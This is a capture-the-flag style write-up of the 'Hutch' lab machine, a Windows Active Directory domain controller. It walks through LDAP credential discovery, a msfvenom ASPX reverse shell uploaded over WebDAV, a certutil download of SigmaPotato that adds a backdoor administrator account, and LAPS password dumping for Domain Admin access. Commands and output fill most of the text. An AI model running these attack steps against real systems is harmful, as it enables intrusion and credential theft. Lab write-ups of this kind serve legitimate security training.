# Hutch - Proving Grounds Practice

> **Kill Chain Summary**: LDAP Anonymous Enumeration reveals domain credentials in user description (fmcsorley) -> WebDAV enabled on IIS root with PUT method allowed -> Uploading malicious ASPX reverse shell -> Shell as iis apppool\defaultapppool -> PrivEsc Vector 1: SeImpersonatePrivilege abused via SigmaPotato -> Local Administrator / PrivEsc Vector 2: fmcsorley reads LAPS password via LDAP attribute -> Direct Domain Administrator access via WMI.

| Property | Value |
|---|---|
| **Target Name** | Hutch |
| **Platform** | Proving Grounds Practice |
| **OS** | Windows Server 2019 (Active Directory) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | LDAP Anonymous Enumeration, WebDAV ASPX File Upload, SeImpersonatePrivilege (SigmaPotato), LAPS Password Dumping via LDAP |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We begin with TCP and UDP port scans:

```bash
# TCP Scan (Fast and Full)
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/tcp_all
```

**TCP Port Scan Results:**
```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

```bash
# UDP Scan (Top 20 ports)
sudo nmap -sU --top-ports 20 -Pn $IP -oA nmap/udp_top20
```

```text
PORT      STATE SERVICE
53/udp    open  domain
123/udp   open  ntp
```

The presence of Kerberos (88), LDAP (389), SMB (445), and DNS (53) identifies this target as a Windows Active Directory Domain Controller (`hutch.offsec` / `HUTCHDC`).

---

### 1.2 Web and WebDAV Enumeration (Port 80)

Port 80 runs Microsoft IIS 10.0.

Testing for allowed HTTP methods using an `OPTIONS` request:

```bash
curl -s -I -X OPTIONS http://$IP/
```

**Output:**
```http
HTTP/1.1 200 OK
Allow: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
Server: Microsoft-IIS/10.0
Public: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
DAV: 1,2,3
MS-Author-Via: DAV
```

WebDAV is actively enabled on the web root with dangerous file manipulation methods allowed, including `PUT`, `MOVE`, and `PROPFIND`.

---

### 1.3 LDAP Anonymous Enumeration (Port 389)

We query Active Directory objects over LDAP without credentials:

```bash
ldapsearch -x -H ldap://$IP -b "DC=hutch,DC=offsec" > ldap_anonymous.txt
grep -i -E "description|pass" ldap_anonymous.txt
```

In the description field of user `fmcsorley`:

```text
description: Password: CrabSharkJellyfish192
sAMAccountName: fmcsorley
```

Validating credentials against SMB using NetExec:

```bash
nxc smb $IP -u 'fmcsorley' -p 'CrabSharkJellyfish192'
```

```text
SMB         192.168.x.x 445    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
SMB         192.168.x.x 445    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192
```

Authentication is successful.

---

## 2. Initial Access

### 2.1 WebDAV ASPX File Upload

With valid domain credentials for `fmcsorley`, we can leverage WebDAV to upload an executable ASPX reverse shell:

1. Generate the ASPX reverse shell with msfvenom:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=4444 -f aspx -o shell.aspx
   ```

2. Upload the payload using HTTP Basic Authentication:
   ```bash
   curl -u 'fmcsorley:CrabSharkJellyfish192' -T shell.aspx http://$IP/shell.aspx
   ```

3. Setup a Netcat listener and trigger the shell:
   ```bash
   # Listener:
   sudo nc -lvnp 4444

   # Trigger:
   curl http://$IP/shell.aspx
   ```

Catching the reverse shell:
```cmd
c:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

Checking user flag:
```cmd
type C:\Users\fmcsorley\Desktop\local.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

Two independent privilege escalation paths were validated on this system:

### Path 1: SeImpersonatePrivilege via Potato Exploit (From Web Shell)

Checking service account privileges:

```cmd
whoami /priv
```

```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= =======
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
```

With `SeImpersonatePrivilege` enabled, we transfer **SigmaPotato** to execute administrative commands under `NT AUTHORITY\SYSTEM`:

```cmd
certutil -urlcache -f http://KALI_IP/SigmaPotato.exe C:\Windows\Temp\SigmaPotato.exe

C:\Windows\Temp\SigmaPotato.exe --rev "net user attacker Password123! /add"
C:\Windows\Temp\SigmaPotato.exe --rev "net localgroup Administrators attacker /add"
C:\Windows\Temp\SigmaPotato.exe --rev "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

Logging in via WinRM as our new local administrator:

```bash
evil-winrm -i $IP -u 'attacker' -p 'Password123!'
```

```powershell
*Evil-WinRM* PS C:\Users\attacker> whoami
hutch\attacker

*Evil-WinRM* PS C:\Users\attacker> type C:\Users\Administrator\Desktop\proof.txt
[FLAG REDACTED]
```

---

### Path 2: Direct LAPS Password Extraction via LDAP (No Web Shell Required)

The user `fmcsorley` has permissions to read the LAPS password attribute (`ms-Mcs-AdmPwd`) directly from the Active Directory schema. This allows obtaining the Domain Administrator password without needing the web shell or potato exploit.

Using NetExec from Kali:

```bash
nxc ldap $IP -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps
```

**Output:**
```text
LDAP        192.168.x.x 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
LDAP        192.168.x.x 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
LAPS        192.168.x.x 389    HUTCHDC          [*] Getting LAPS Passwords
LAPS        192.168.x.x 389    HUTCHDC          Computer:HUTCHDC$ User:                Password:[5krP5/55F+39V
```

Connecting directly as Domain Administrator using WMI:

```bash
impacket-wmiexec hutch.offsec/Administrator:'[5krP5/55F+39V'@$IP
```

```cmd
C:\> whoami
hutch\administrator

C:\> type C:\Users\Administrator\Desktop\proof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Test WebDAV allowed HTTP methods
curl -s -I -X OPTIONS http://[TARGET_IP]/

# Anonymous LDAP search for credentials
ldapsearch -x -H ldap://[TARGET_IP] -b "DC=domain,DC=local" "(description=*)"

# Upload file via authenticated WebDAV PUT
curl -u 'user:pass' -T payload.aspx http://[TARGET_IP]/payload.aspx

# Extract LAPS passwords via LDAP
nxc ldap [TARGET_IP] -u 'user' -p 'pass' -M laps
```

---

## 5. Key Takeaways and Lessons Learned

1. **Always Check HTTP OPTIONS on IIS:** Never overlook running `curl -s -I -X OPTIONS http://$IP/` against IIS web servers. When WebDAV is active with `PUT` or `MOVE` allowed, code upload is immediate once credentials are recovered.
2. **Prioritize LAPS Enumeration:** Whenever valid domain user credentials are recovered, always query for LAPS passwords (`nxc ldap $IP -u USER -p PASS -M laps`). If read rights are misconfigured on computer objects, you can bypass all local privilege escalation steps and obtain root domain credentials immediately.
3. **Potato Exploits on IIS:** Service accounts like `iis apppool\defaultapppool` inherently hold `SeImpersonatePrivilege`. Standard tools like SigmaPotato or GodPotato provide a reliable path to local SYSTEM.

---

### Tags
#windows #active-directory #ldap #webdav #laps #seimpersonate #sigmapotato #medium #pg-practice #rooted
